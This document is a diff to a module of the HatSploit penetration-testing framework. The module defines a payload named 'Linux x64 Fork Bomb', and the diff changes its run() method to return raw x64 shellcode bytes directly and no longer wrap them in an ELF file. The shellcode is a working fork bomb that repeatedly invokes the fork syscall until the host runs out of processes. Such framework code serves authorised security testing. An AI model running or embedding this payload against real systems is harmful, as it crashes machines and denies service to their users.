@@ -5,11 +5,10 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Fork Bomb",
@@ -28,9 +27,6 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        shellcode = (
+        return (
             b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
         )
-
-        payload = self.generate('elf', 'x64', shellcode)
-        return payload
